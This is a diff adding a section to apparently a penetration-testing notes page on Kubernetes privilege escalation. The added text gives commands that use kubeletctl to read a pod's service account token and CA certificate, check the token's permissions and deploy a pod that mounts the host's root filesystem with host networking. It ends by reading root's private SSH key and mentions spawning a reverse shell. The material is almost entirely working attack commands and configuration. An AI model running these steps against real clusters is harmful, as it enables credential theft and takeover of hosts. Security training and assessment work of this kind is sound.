@@ -100,16 +100,60 @@
 ## Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>
 
 * Utilize a tool called [kubeletctl](https://github.com/cyberark/kubeletctl) to obtain the Kubernetes service account's `token` and `certificate` (`ca.crt`) from the server.
+* To do this, we must provide the server's IP address, namespace, and target pod. In case we get this token and certificate, we can elevate our privileges even more, move horizontally throughout the cluster, or gain access to additional pods and resources.
 
+### Kubelet API - Extracting Tokens
 
+* `kubeletctl -i --server <API-Server-IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <pod-name> -c <container-name> | tee -a k8.token`
 
+### Kubelet API - Extracting Certificates
 
+* `kubeletctl --server <API-Server-IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p <pod-name> -c <container-name> | tee -a ca.crt`&#x20;
 
+### List Privileges
 
+* `` export token=`cat k8.token` ``&#x20;
+* `kubectl --token=$token --certificate-authority=ca.crt --server=https://<API-Server-IP>:6443 auth can-i --list`
 
+### Pod YAML
 
+* We can create a `YAML` file that we can use to create a new container and mount the entire root filesystem from the host system into this container's `/root` directory.
 
+<details>
 
+<summary>YAML Config - PrivEsc.yaml</summary>
 
+{% code lineNumbers="true" %}
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privesc
+  namespace: default
+spec:
+  containers:
+  - name: privesc
+    image: <existing-image-name-with-version-obtained-from-above-enumeration>
+    volumeMounts:
+    - mountPath: /root
+      name: mount-root-into-mnt
+  volumes:
+  - name: mount-root-into-mnt
+    hostPath:
+       path: /
+  automountServiceAccountToken: true
+  hostNetwork: true
+```
+{% endcode %}
 
+</details>
 
+### Create new Pod
+
+* `kubectl --token=$token --certificate-authority=ca.crt --server=https://<API-Server-IP>:6443 apply -f privesc.yaml`&#x20;
+* `kubectl --token=$token --certificate-authority=ca.crt --server=https://<API-Server-IP>:6443 get pods`&#x20;
+
+### Extracting Root's SSH Key
+
+* We can execute the command and we could spawn a reverse shell or retrieve sensitive data like private SSH key from the root user.
+* `kubeletctl --server <API-Server-IP> exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc`
